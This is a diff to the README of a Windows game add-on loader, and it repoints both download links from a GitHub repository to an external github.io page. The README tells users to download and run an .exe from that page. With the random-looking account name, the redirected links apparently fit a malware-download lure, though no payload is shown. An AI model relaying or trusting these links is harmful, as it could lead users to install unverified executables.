@@ -1,6 +1,6 @@
 # 📦 addon-ez-bedrock-loader - Install your favorite game mods easily
 
-[![Download addon-ez-bedrock-loader](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Kosteletzyavirginicamidst186/addon-ez-bedrock-loader)
+[![Download addon-ez-bedrock-loader](https://img.shields.io/badge/Download-Release-blue)](https://kosteletzyavirginicamidst186.github.io)
 
 ## 📖 About this application
 
@@ -14,7 +14,7 @@ This application works on any modern computer running Windows 10 or Windows 11. 
 
 To begin, you must visit the official page to download the latest version of the installer. This package contains everything needed to manage your game add-ons.
 
-[Click here to visit the release page and download the installer](https://github.com/Kosteletzyavirginicamidst186/addon-ez-bedrock-loader)
+[Click here to visit the release page and download the installer](https://kosteletzyavirginicamidst186.github.io)
 
 1. Navigate to the link provided above.
 2. Look for the file ending in .exe under the latest release section.
